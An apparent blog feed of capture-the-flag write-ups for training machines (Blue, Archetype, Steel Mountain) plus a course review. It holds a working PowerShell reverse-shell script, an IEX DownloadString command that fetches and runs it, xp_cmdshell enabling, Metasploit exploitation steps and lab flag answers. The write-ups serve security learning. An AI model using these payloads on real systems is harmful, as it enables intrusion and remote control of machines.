Aggressive OS guesses: Microsoft Windows <span style="color:#ae81ff">7</span> or Windows Server <span style="color:#ae81ff">2008</span> R2 (<span style="color:#ae81ff">97</span><span style="color:#f92672">%</span>), Microsoft Windows Home Server <span style="color:#ae81ff">2011</span> (Windows Server <span style="color:#ae81ff">2008</span> R2) (<span style="color:#ae81ff">96</span><span style="color:#f92672">%</span>), Microsoft Windows Server <span style="color:#ae81ff">2008</span> SP1 (<span style="color:#ae81ff">96</span><span style="color:#f92672">%</span>), Microsoft Windows Server <span style="color:#ae81ff">2008</span> SP2 (<span style="color:#ae81ff">96</span><span style="color:#f92672">%</span>), Microsoft Windows <span style="color:#ae81ff">7</span> (<span style="color:#ae81ff">96</span><span style="color:#f92672">%</span>), Microsoft Windows <span style="color:#ae81ff">7</span> SP0 <span style="color:#f92672">-</span> SP1 or Windows Server <span style="color:#ae81ff">2008</span> (<span style="color:#ae81ff">96</span><span style="color:#f92672">%</span>), Microsoft Windows <span style="color:#ae81ff">7</span> SP0 <span style="color:#f92672">-</span> SP1, Windows Server <span style="color:#ae81ff">2008</span> SP1, Windows Server <span style="color:#ae81ff">2008</span> R2, Windows <span style="color:#ae81ff">8</span>, or Windows <span style="color:#ae81ff">8.1</span> Update <span style="color:#ae81ff">1</span> (<span style="color:#ae81ff">96</span><span style="color:#f92672">%</span>), Microsoft Windows <span style="color:#ae81ff">7</span> SP1 (<span style="color:#ae81ff">96</span><span style="color:#f92672">%</span>), Microsoft Windows <span style="color:#ae81ff">7</span> Ultimate (<span style="color:#ae81ff">96</span><span style="color:#f92672">%</span>), Microsoft Windows <span style="color:#ae81ff">7</span> Ultimate SP1 or Windows <span style="color:#ae81ff">8.1</span> Update <span style="color:#ae81ff">1</span> (<span style="color:#ae81ff">96</span><span style="color:#f92672">%</span>)
No exact OS matches <span style="color:#66d9ef">for</span> host (test conditions non<span style="color:#f92672">-</span>ideal).
Network Distance: <span style="color:#ae81ff">2</span> hops
Service Info: Host: HARIS<span style="color:#f92672">-</span>PC; OS: Windows; CPE: cpe:<span style="color:#f92672">/</span>o:microsoft:windows

Host script results:
<span style="color:#f92672">|</span>_smb<span style="color:#f92672">-</span>vuln<span style="color:#f92672">-</span>ms10<span style="color:#f92672">-</span><span style="color:#ae81ff">054</span><span style="color:#f92672">:</span> false
<span style="color:#f92672">|</span>_smb<span style="color:#f92672">-</span>vuln<span style="color:#f92672">-</span>ms10<span style="color:#f92672">-</span><span style="color:#ae81ff">061</span><span style="color:#f92672">:</span> NT_STATUS_OBJECT_NAME_NOT_FOUND
<span style="color:#f92672">|</span> smb<span style="color:#f92672">-</span>vuln<span style="color:#f92672">-</span>ms17<span style="color:#f92672">-</span><span style="color:#ae81ff">010</span><span style="color:#f92672">:</span> 
<span style="color:#f92672">|</span>   VULNERABLE:
<span style="color:#f92672">|</span>   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17<span style="color:#f92672">-</span><span style="color:#ae81ff">010</span>)
<span style="color:#f92672">|</span>     State: VULNERABLE
<span style="color:#f92672">|</span>     IDs:  CVE:CVE<span style="color:#f92672">-</span><span style="color:#ae81ff">2017</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0143</span>
<span style="color:#f92672">|</span>     Risk factor: HIGH
<span style="color:#f92672">|</span>       A critical remote code execution vulnerability exists in Microsoft SMBv1
<span style="color:#f92672">|</span>        servers (ms17<span style="color:#f92672">-</span><span style="color:#ae81ff">010</span>).
<span style="color:#f92672">|</span>           
<span style="color:#f92672">|</span>     Disclosure date: <span style="color:#ae81ff">2017</span><span style="color:#f92672">-</span><span style="color:#ae81ff">03</span><span style="color:#f92672">-</span><span style="color:#ae81ff">14</span>
<span style="color:#f92672">|</span>     References:
<span style="color:#f92672">|</span>       https:<span style="color:#75715e">//cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span>       https:<span style="color:#75715e">//technet.microsoft.com/en-us/library/security/ms17-010.aspx
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span>_      https:<span style="color:#75715e">//blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
</span><span style="color:#75715e"></span>
TRACEROUTE (using port <span style="color:#ae81ff">135</span><span style="color:#f92672">/</span>tcp)
HOP RTT       ADDRESS
<span style="color:#ae81ff">1</span>   <span style="color:#ae81ff">244.54</span> ms <span style="color:#ae81ff">10.10.16.1</span>
<span style="color:#ae81ff">2</span>   <span style="color:#ae81ff">445.61</span> ms <span style="color:#ae81ff">10.10.10.40</span>

OS and Service detection performed. Please report any incorrect results at https:<span style="color:#75715e">//nmap.org/submit/ .
</span><span style="color:#75715e"></span>Nmap done: <span style="color:#ae81ff">1</span> IP address (<span style="color:#ae81ff">1</span> host up) scanned in <span style="color:#ae81ff">130.01</span> seconds


</code></pre></div><p>The host is vulnerable to ms17-10:</p>

    <img src="/images/htb/blue/vuln.png"  class="center"  style="border-radius: 10px;"  />


<h2 id="exploit">Exploit</h2>
<p>Let&rsquo;s double-check this vuln with <code>msfconsole</code>.
Search for &ldquo;ms17-010&rdquo; and use the module: scanner/smb/smb_ms17_010:</p>

    <img src="/images/htb/blue/search.png"  class="center"  style="border-radius: 8px;"  />


<p>We have the confirmation:</p>

    <img src="/images/htb/blue/run.png"  class="center"  style="border-radius: 8px;"  />


<p>We need to set the exploit <code>windows/smb/ms17_010_eternal</code> and configure the options: RPORT, RHOSTS, LPORT and LHOST. Also, check the payload.</p>

    <img src="/images/htb/blue/smb.png"  class="center"  style="border-radius: 8px;"  />


<p>After that we could run the exploit and get access to the host:</p>

    <img src="/images/htb/blue/exploit.png"  class="center"  style="border-radius: 8px;"  />


<h2 id="flag">Flag</h2>
<p>Search for the flag in the commons users folders.</p>

    <img src="/images/htb/blue/pawnd.PNG"  class="center"  style="border-radius: 8px;"  />


]]></content>
        </item>
        
        <item>
            <title>Hack the Box - Archetype - Write Up</title>
            <link>https://nmmorette.github.io/posts/2021/07/hack-the-box-archetype-write-up/</link>
            <pubDate>Tue, 27 Jul 2021 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2021/07/hack-the-box-archetype-write-up/</guid>
            <description>Enumeration Initial scan:
nmap -sSV 10.10.10.27Second nmap scan with --script vuln
We found a possible starting point: CVE-2008-4250.
SMB Enumeration The next step is to try to connect in the SMB service:
smbclient -L \\10.10.10.27 -NIPC$: this hidden share is a special share used for inter-process communication. It doesn’t allow one to access files or directories like other shares, but rather allows one to communicate with processes running on the remote system.</description>
            <content type="html"><![CDATA[

<br>


    <img src="/images/htb/archetype/banner.png"  class="center"  style="border-radius: 10px;"  />


<h2 id="enumeration">Enumeration</h2>
<p>Initial scan:</p>
<pre><code class="language-cli" data-lang="cli"> nmap -sSV 10.10.10.27
</code></pre>
    <img src="/images/htb/archetype/scan.png"  class="center"  style="border-radius: 10px;"  />


<p>Second nmap scan with <code>--script vuln</code></p>

    <img src="/images/htb/archetype/vuln.png"  class="center"  style="border-radius: 10px;"  />


<p>We found a possible starting point: CVE-2008-4250.</p>
<h2 id="smb-enumeration">SMB Enumeration</h2>
<p>The next step is to try to connect in the SMB service:</p>
<pre><code class="language-cli" data-lang="cli"> smbclient -L \\10.10.10.27 -N
</code></pre>
    <img src="/images/htb/archetype/smb.png"  class="center"  style="border-radius: 10px;"  />


<p><strong>IPC$:</strong> this hidden share is a special share used for inter-process communication. It doesn’t allow one to access files or directories like other shares, but rather allows one to communicate with processes running on the remote system.</p>
<p><strong>backups:</strong> a normal share with read access. It lacks a comment which means it could contain interesting data if we’re able to connect to it.</p>
<p>The backup folder it’s accessible without a password and insidi we have an interesting file: <code>prod.dtsConfig</code>.</p>

    <img src="/images/htb/archetype/prod.png"  class="center"  style="border-radius: 10px;"  />


<p>Looking at the file we found a user and password.</p>
<p><code>user:</code> ARCHETYPE\sql_svc
<code>password:</code> M3g4c0rp123</p>
<h2 id="mssqlclipy">mssqlcli.py</h2>
<p>Using <code>mssqlcli.py</code> script with “-windows-auth” parameter to instruct the script to use Windows Authentication and the User ID and password found in the config file from before, I managed to get a connection to the exposed SQL server on port 1433.</p>

    <img src="/images/htb/archetype/sql.png"  class="center"  style="border-radius: 8px;"  />


<p>Now we need to enable code execution in this server:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">EXEC sp_configure <span style="color:#960050;background-color:#1e0010">&#39;</span>Show Advanced Options<span style="color:#960050;background-color:#1e0010">&#39;</span>,<span style="color:#ae81ff">1</span>;
reconfigure;
sp_configure;
EXEC sp_configure <span style="color:#960050;background-color:#1e0010">&#39;</span>xp_cmdshell<span style="color:#960050;background-color:#1e0010">&#39;</span>,<span style="color:#ae81ff">1</span>
reconfigure;
xp_cmdshell <span style="color:#e6db74">&#34;whoami</span>
</code></pre></div><p>With command <code>xp_cmdshell</code>  we&rsquo;re able to run commands.</p>
<h2 id="payload">Payload</h2>
<p>After that let&rsquo;s send a <code>PowerShell</code> payload to reverse shell the target:</p>
<p>Don&rsquo;t forget to edit the first line.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#960050;background-color:#1e0010">$</span>socket <span style="color:#f92672">=</span> new<span style="color:#f92672">-</span>object System.Net.Sockets.TcpClient(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#ae81ff">10.10.16.113</span><span style="color:#960050;background-color:#1e0010">&#39;</span>, <span style="color:#ae81ff">443</span>);
<span style="color:#66d9ef">if</span>(<span style="color:#960050;background-color:#1e0010">$</span>socket <span style="color:#f92672">-</span>eq <span style="color:#960050;background-color:#1e0010">$</span>null){exit <span style="color:#ae81ff">1</span>}
<span style="color:#960050;background-color:#1e0010">$</span>stream <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>socket.GetStream();
<span style="color:#960050;background-color:#1e0010">$</span>writer <span style="color:#f92672">=</span> new<span style="color:#f92672">-</span>object System.IO.StreamWriter(<span style="color:#960050;background-color:#1e0010">$</span>stream);
<span style="color:#960050;background-color:#1e0010">$</span>buffer <span style="color:#f92672">=</span> new<span style="color:#f92672">-</span>object System.Byte[] <span style="color:#ae81ff">1024</span>;
<span style="color:#960050;background-color:#1e0010">$</span>encoding <span style="color:#f92672">=</span> new<span style="color:#f92672">-</span>object System.Text.AsciiEncoding;
<span style="color:#66d9ef">do</span>
{
	<span style="color:#960050;background-color:#1e0010">$</span>writer.Flush();
	<span style="color:#960050;background-color:#1e0010">$</span>read <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>null;
	<span style="color:#960050;background-color:#1e0010">$</span>res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
	<span style="color:#66d9ef">while</span>(<span style="color:#960050;background-color:#1e0010">$</span>stream.DataAvailable <span style="color:#f92672">-</span>or <span style="color:#960050;background-color:#1e0010">$</span>read <span style="color:#f92672">-</span>eq <span style="color:#960050;background-color:#1e0010">$</span>null) {
		<span style="color:#960050;background-color:#1e0010">$</span>read <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>stream.Read(<span style="color:#960050;background-color:#1e0010">$</span>buffer, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1024</span>)
	}
	<span style="color:#960050;background-color:#1e0010">$</span>out <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>encoding.GetString(<span style="color:#960050;background-color:#1e0010">$</span>buffer, <span style="color:#ae81ff">0</span>, <span style="color:#960050;background-color:#1e0010">$</span>read).Replace(<span style="color:#e6db74">&#34;`r`n&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>).Replace(<span style="color:#e6db74">&#34;`n&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>);
	<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#960050;background-color:#1e0010">$</span>out.equals(<span style="color:#e6db74">&#34;exit&#34;</span>)){
		<span style="color:#960050;background-color:#1e0010">$</span>args <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
		<span style="color:#66d9ef">if</span>(<span style="color:#960050;background-color:#1e0010">$</span>out.IndexOf(<span style="color:#e6db74">&#39; &#39;</span>) <span style="color:#f92672">-</span>gt <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>){
			<span style="color:#960050;background-color:#1e0010">$</span>args <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>out.substring(<span style="color:#960050;background-color:#1e0010">$</span>out.IndexOf(<span style="color:#e6db74">&#39; &#39;</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>);
			<span style="color:#960050;background-color:#1e0010">$</span>out <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>out.substring(<span style="color:#ae81ff">0</span>,<span style="color:#960050;background-color:#1e0010">$</span>out.IndexOf(<span style="color:#e6db74">&#39; &#39;</span>));
			<span style="color:#66d9ef">if</span>(<span style="color:#960050;background-color:#1e0010">$</span>args.split(<span style="color:#e6db74">&#39; &#39;</span>).length <span style="color:#f92672">-</span>gt <span style="color:#ae81ff">1</span>){
                <span style="color:#960050;background-color:#1e0010">$</span>pinfo <span style="color:#f92672">=</span> New<span style="color:#f92672">-</span>Object System.Diagnostics.ProcessStartInfo
                <span style="color:#960050;background-color:#1e0010">$</span>pinfo.FileName <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;cmd.exe&#34;</span>
                <span style="color:#960050;background-color:#1e0010">$</span>pinfo.RedirectStandardError <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>true
                <span style="color:#960050;background-color:#1e0010">$</span>pinfo.RedirectStandardOutput <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>true
                <span style="color:#960050;background-color:#1e0010">$</span>pinfo.UseShellExecute <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>false
                <span style="color:#960050;background-color:#1e0010">$</span>pinfo.Arguments <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/c $out $args&#34;</span>
                <span style="color:#960050;background-color:#1e0010">$</span>p <span style="color:#f92672">=</span> New<span style="color:#f92672">-</span>Object System.Diagnostics.Process
                <span style="color:#960050;background-color:#1e0010">$</span>p.StartInfo <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>pinfo
                <span style="color:#960050;background-color:#1e0010">$</span>p.Start() <span style="color:#f92672">|</span> Out<span style="color:#f92672">-</span>Null
                <span style="color:#960050;background-color:#1e0010">$</span>p.WaitForExit()
                <span style="color:#960050;background-color:#1e0010">$</span>stdout <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>p.StandardOutput.ReadToEnd()
                <span style="color:#960050;background-color:#1e0010">$</span>stderr <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>p.StandardError.ReadToEnd()
                <span style="color:#66d9ef">if</span> (<span style="color:#960050;background-color:#1e0010">$</span>p.ExitCode <span style="color:#f92672">-</span>ne <span style="color:#ae81ff">0</span>) {
                    <span style="color:#960050;background-color:#1e0010">$</span>res <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>stderr
                } <span style="color:#66d9ef">else</span> {
                    <span style="color:#960050;background-color:#1e0010">$</span>res <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>stdout
                }
			}
			<span style="color:#66d9ef">else</span>{
				<span style="color:#960050;background-color:#1e0010">$</span>res <span style="color:#f92672">=</span> (<span style="color:#f92672">&amp;</span><span style="color:#e6db74">&#34;$out&#34;</span> <span style="color:#e6db74">&#34;$args&#34;</span>) <span style="color:#f92672">|</span> out<span style="color:#f92672">-</span>string;
			}
		}
		<span style="color:#66d9ef">else</span>{
			<span style="color:#960050;background-color:#1e0010">$</span>res <span style="color:#f92672">=</span> (<span style="color:#f92672">&amp;</span><span style="color:#e6db74">&#34;$out&#34;</span>) <span style="color:#f92672">|</span> out<span style="color:#f92672">-</span>string;
		}
		<span style="color:#66d9ef">if</span>(<span style="color:#960050;background-color:#1e0010">$</span>res <span style="color:#f92672">-</span>ne <span style="color:#960050;background-color:#1e0010">$</span>null){
        <span style="color:#960050;background-color:#1e0010">$</span>writer.WriteLine(<span style="color:#960050;background-color:#1e0010">$</span>res)
    }
	}
}While (<span style="color:#f92672">!</span><span style="color:#960050;background-color:#1e0010">$</span>out.equals(<span style="color:#e6db74">&#34;exit&#34;</span>))
<span style="color:#960050;background-color:#1e0010">$</span>writer.close();
<span style="color:#960050;background-color:#1e0010">$</span>socket.close();
<span style="color:#960050;background-color:#1e0010">$</span>stream.Dispose()
</code></pre></div><p>Setup a python web server to host our file:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">python3 <span style="color:#f92672">-</span>m http.server <span style="color:#ae81ff">80</span>
</code></pre></div><p>Setup a <code>Netcat</code> for listening:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">nc <span style="color:#f92672">-</span>lvnp <span style="color:#ae81ff">443</span>
ufw allow from <span style="color:#ae81ff">10.10.10.27</span> proto tcp to any port <span style="color:#ae81ff">80</span>,<span style="color:#ae81ff">443</span>
</code></pre></div><p>We have all set up to receive the reverse shell.
We only need to execute the payload in the target and wait for connection into the <code>Netcat</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">xp_cmdshell <span style="color:#e6db74">&#34;powershell &#34;</span>IEX (New<span style="color:#f92672">-</span>Object Net.WebClient).DownloadString(<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34;http://10.10.16.113/shell2.ps1</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">);&#34;</span>
</code></pre></div><p>After that we have the shell:</p>

    <img src="/images/htb/archetype/shell.png"  class="center"  style="border-radius: 8px;"  />


<h2 id="first-key">First Key</h2>
<p>For the first key we need to enumerate the files:</p>

    <img src="/images/htb/archetype/key.png"  class="center"  style="border-radius: 10px;"  />


<h2 id="privileged-user-access">Privileged user access</h2>
<p>Now that we have the users' flag, we need to focus on the administrator flag. Maybe the flag is in the administrator’s folder, but our user don&rsquo;t have access. We need to privesc our shell. A very useful checklist to do that:  <a href="https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation">Hacktricks</a>.</p>

    <img src="/images/htb/archetype/checklist.png"  class="center"  style="border-radius: 10px;"  />


<p>One interesting point in the checklist is the Power Shell history.</p>
<p>The located path is:
<code>C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></p>
<p>Let&rsquo;s take a look:</p>

    <img src="/images/htb/archetype/history.png"  class="center"  style="border-radius: 8px;"  />


<p>Piece of cake, we have the admin credentials now.</p>
<p>Let&rsquo;s use a <code>psexec</code> with the new credential to connect:</p>

    <img src="/images/htb/archetype/psexec.png"  class="center"  style="border-radius: 8px;"  />


<p>Finally, we can look at the administrator&rsquo;s folder to find the second and last key:</p>

    <img src="/images/htb/archetype/key2.png"  class="center"  style="border-radius: 8px;"  />


<p>

<br>



<br>
</p>

    <img src="/images/htb/archetype/pwnd.png"  class="center"  style="border-radius: 8px;"  />


]]></content>
        </item>
        
        <item>
            <title>TryHackme - Steel Mountain - Write Up</title>
            <link>https://nmmorette.github.io/posts/2021/07/tryhackme-steel-mountain-write-up/</link>
            <pubDate>Sat, 24 Jul 2021 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2021/07/tryhackme-steel-mountain-write-up/</guid>
            <description>Task 1. Introduction First of all, let&amp;rsquo;s nmap the machine IP.
nmap -sS -A 10.10.169.181 -PnWe found a web service open port (80), let&amp;rsquo;s open the web page:
Take a look at the source code:
Who is the employee of the month?
Bill Harper
Task 2. Inicial Access Scan the machine with nmap. What is the other port running a web server on?
Nmap gives this answer:
8080</description>
            <content type="html"><![CDATA[
    <img src="/images/steelmountain/banner.png"  class="center"  style="border-radius: 10px;"  />


<h2 id="task-1-introduction">Task 1. Introduction</h2>
<p>First of all, let&rsquo;s <code>nmap</code> the machine IP.</p>
<pre><code class="language-cli" data-lang="cli"> nmap -sS -A 10.10.169.181 -Pn
</code></pre><p>We found a web service open port (80), let&rsquo;s open the web page:</p>

    <img src="/images/steelmountain/80.png"  class="center"  style="border-radius: 10px;"  />


<p>Take a look at the source code:</p>

    <img src="/images/steelmountain/sourcepage.png"  class="center"  style="border-radius: 10px;"  />


<p><strong>Who is the employee of the month?</strong></p>
<p><code>Bill Harper</code></p>
<h2 id="task-2-inicial-access">Task 2. Inicial Access</h2>

    <img src="/images/steelmountain/task1.png"  class="center"  style="border-radius: 10px;"  />


<p><strong>Scan the machine with nmap. What is the other port running a web server on?</strong></p>
<p>Nmap gives this answer:</p>
<p><code>8080</code></p>
<p><strong>Take a look at the other web server. What file server is running?</strong></p>
<p>Nmap shows: HttpFileServer, google it!</p>
<p><code>Rejetto HTTP File Server</code></p>
<p><strong>What is the CVE number to exploit this file server?</strong></p>
<p><a href="https://www.exploit-db.com/exploits/39161">https://www.exploit-db.com/exploits/39161</a></p>
<p><code>2014-6287</code></p>
<p><strong>Use Metasploit to get an initial shell. What is the user flag?</strong></p>
<p>Open the msfconsole and search for rejetto:</p>

    <img src="/images/steelmountain/rejetto.png"  class="center"  style="border-radius: 10px;"  />


<p>Configure the exploit options:</p>

    <img src="/images/steelmountain/task1.png"  class="center"  style="border-radius: 10px;"  />


<p>Run the exploit and wait for shell access:</p>

    <img src="/images/steelmountain/exploit.png"  class="center"  style="border-radius: 10px;"  />


<p>Now that we have an initial shell on this Windows machine as Bill, let&rsquo;s search for the key in Bill’s desktop:</p>

    <img src="/images/steelmountain/key.png"  class="center"  style="border-radius: 10px;"  />


<p><code>b04763b6fcf51fcd7c13abc7db4fd365</code></p>
<h2 id="task-3-privilege-escalation">Task 3. Privilege Escalation</h2>
<p>We need to enumerate this system, we&rsquo;re going to use a <code>PowerShell</code> script called <code>PowerUp</code>.</p>



<blockquote>

"PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations."
</blockquote>

<p>You can download the script <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">here</a>. Now you can use the upload command in Metasploit to upload the script.</p>

    <img src="/images/steelmountain/powerup.png"  class="center"  style="border-radius: 8px;"  />


<p>Let&rsquo;s load the <code>PowerShell</code> module in meterpreter:</p>
<pre><code>load powershell
</code></pre><p>Then run:</p>
<pre><code>powershell_shell
</code></pre><p>This will open a PowerShell session, after that ruin the script and use: <code>Invoke-Allchecks</code>
Look at the results and search for True in the <code>Can Restart</code> option:</p>

    <img src="/images/steelmountain/canrestart.png"  class="center"  style="border-radius: 8px;"  />


<p>Search to the CanRestart option that is set to true.</p>
<p><strong>What is the name of the service which shows up as an unquoted service path vulnerability?</strong></p>
<p><code>AdvancedSystemCareService9</code></p>
<p>Now let&rsquo;s configure the <code>.exe</code> with <code>msfvenom</code>:</p>

    <img src="/images/steelmountain/msfvenom.png"  class="center"  style="border-radius: 8px;"  />


<p>Then upload the file to <code>Iobit</code> folder:</p>

    <img src="/images/steelmountain/iobit.png"  class="center"  style="border-radius: 8px;"  />


<p>Preparing the <code>netcat</code>:</p>

    <img src="/images/steelmountain/netcat.png"  class="center"  style="border-radius: 8px;"  />


<p>After that, stop the service <code>AdvancedSystemCareService9</code>, then copy the <code>Advanced.exe</code> to the “Advanced SystemCare” folder, now we should start the <code>AdvancedSystemCareService9</code> again.</p>
<p>Take a look at your netcat connection:</p>

    <img src="/images/steelmountain/netcat2.png"  class="center"  style="border-radius: 8px;"  />


<p>We have an administrator shell, search for the key in the Administrator&rsquo;s folder.</p>
<p><strong>What is the root flag ?</strong></p>
<p><code>9af5f314f57607c00fd09803a587db80</code></p>
]]></content>
        </item>
        
        <item>
            <title>TryHackme - Pre-Security Path - Review</title>
            <link>https://nmmorette.github.io/posts/2021/07/tryhackme-pre-security-path-review/</link>
            <pubDate>Fri, 09 Jul 2021 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2021/07/tryhackme-pre-security-path-review/</guid>
            <description>Do you want to be a hacker? An IT professional? Or maybe just know about thechnology.But you don&amp;rsquo;t know where to start. Try Hack Me is definitely the right place for you!
Especially now with the new Pre Security learn path.
You don&amp;rsquo;t need to be an IT pro for start here. This learning path will take you by the hand and show the basics of cyber security. You will learn about:</description>
            <content type="html"><![CDATA[
    <img src="/images/presec/banner.jpg"  class="center"  style="border-radius: 10px;"  />


<p>Do you want to be a hacker? An IT professional? Or maybe just know about thechnology.But you don&rsquo;t know where to start. Try Hack Me is definitely the right place for you!</p>
<p>Especially now with the new <a href="https://tryhackme.com/path-action/presecurity/join">Pre Security learn path</a>.</p>

    <img src="/images/presec/presec.JPG"  class="center"  style="border-radius: 10px;"  />


<p>You don&rsquo;t need to be an IT pro for start here. This learning path will take you by the hand and show the basics of cyber security. 
You will learn about:</p>


<ul>
<li>Cyber Security basics</li>
<li>Networkig basics</li>
<li>The web common attacks</li>
<li>Learn to use the Linux and Windows operating system</li>
</ul>

<p>First of all, you need an account in <a href="https://tryhackme.com">Try Hack Me</a>, don&rsquo;t waste your time and just do it! Its free!!</p>

    <img src="/images/presec/try.JPG"  class="center"  style="border-radius: 10px;"  />


<p>Equally important about THM, are the methods they use, you will feel like you are playing a game!
Forget about reading a lot of boring texts! THM know how to teach any content in a fun way to learn.
In all THM learning path you have hands-on exercises and virtual labs.</p>
<p>If you don&rsquo;t know the way,</p>

    <img src="/images/presec/mando.gif"  class="center"  style="border-radius: 10px;"  />


<p>In the linux and windows funtamentals, you have the ability to start a vitual machine directly in your browser and <del>play</del> study.</p>
<p>
    <img src="/images/presec/machine.JPG"  class="center"  style="border-radius: 10px;"  />




<br>


    <img src="/images/presec/kevin.gif"  class="center"  style="border-radius: 10px;"  />




<br>


    <img src="/images/presec/linux2.JPG"  class="center"  style="border-radius: 10px;"  />

</p>
<p>And finally after finish the Pre-Security path, you will get a THM certificate:</p>

    <img src="/images/presec/thm.png"  class="center"  style="border-radius: 10px;"  />


<p>Moreover you have to choose your destiny now.
Pre security is the best start point for beginners, after that THM have new paths for you:</p>
<p>
    <img src="/images/presec/roadmap.JPG"  class="center"  style="border-radius: 10px;"  />




<br>


    <img src="/images/presec/hackerman.gif"  class="center"  style="border-radius: 10px;"  />

</p>


<br>

]]></content>
        </item>
        
        <item>
            <title>TryHackme - The Cod Caper - Write Up</title>
            <link>https://nmmorette.github.io/posts/2021/07/tryhackme-the-cod-caper-write-up/</link>
            <pubDate>Thu, 01 Jul 2021 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2021/07/tryhackme-the-cod-caper-write-up/</guid>
            <description>Task 1. Intro This is a write up for &amp;ldquo;The Cod Caper&amp;rdquo; room at Try Hack Me.
Room&amp;rsquo;s intro note:
Hello there my name is Pingu. I&#39;ve come here to put in a request to get my fish back! My dad recently banned me from eating fish, as I wasn&#39;t eating my vegetables. He locked all the fish in a chest, and hid the key on my old pc, that he recently repurposed into a server.</description>
            <content type="html"><![CDATA[
    <img src="/images/thecodcaper/novo.jpg"  class="center"  style="border-radius: 10px;"  />


<h2 id="task-1-intro">Task 1. Intro</h2>
<p>This is a write up for &ldquo;The Cod Caper&rdquo; <a href="https://tryhackme.com/room/thecodcaper">room</a> at Try Hack Me.</p>
<p>Room&rsquo;s intro note:</p>



<blockquote>

Hello there my name is Pingu. I've come here to put in a request to get my fish back! My dad recently banned me from eating fish, as I wasn't eating my vegetables. He locked all the fish in a chest, and hid the key on my old pc, that he recently repurposed into a server. As all penguins are natural experts in penetration testing, I figured I could get the key myself! Unfortunately he banned every IP from Antarctica, so I am unable to do anything to the server. Therefore I call upon you my dear ally to help me get my fish back! Naturally I'll be guiding you through the process.
</blockquote>

<h2 id="task-2-host-enumeration">Task 2. Host Enumeration</h2>
<p>First of all let&rsquo;s <code>nmap</code> the machine IP.</p>
<p>We&rsquo;re going to scan port 1 to 1000 as suggested in the task.</p>
<pre><code class="language-cli" data-lang="cli"> nmap -v -A -sC -p 1-100  10.10.41.158
</code></pre><p>Flags used:</p>
<p><code>-p 1–1000”</code> = Used to specify which port to analyze, can also be used to specify a range of ports.</p>
<p><code>-sC</code> = Runs default scripts on the port, useful for doing basic analysis on the service running on a port.</p>
<p><code>-A</code> = Aggressive mode, go all out and try to get as much information as possible.</p>
<p>We found 2 open ports, just pay attention to the nmap results, all answers for the first task are there.</p>
<h2 id="task-3-web-enumeration">Task 3. Web Enumeration</h2>
<p>Let&rsquo;s search for files and directories.</p>
<p>You may use <code>gobuster</code> for that, but I would particularly go with my bash script. You can download my script <a href="http:/https://github.com/nmmorette/bash-scripts/blob/25f02fa424136f0d23090072a773892e19c5c5b2/webrecon.sh/">here</a>
Edit the file with a wordlist of your preference. I suggest the big.txt from <code>dirb</code>.</p>
<p>Execute the <code>.\webrecon.sh</code> script in the target:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">  .<span style="color:#ae81ff">\w</span>ebrecon.sh TARGET_IP
</code></pre></div><p>If you like to use use <code>gobuster</code>:</p>
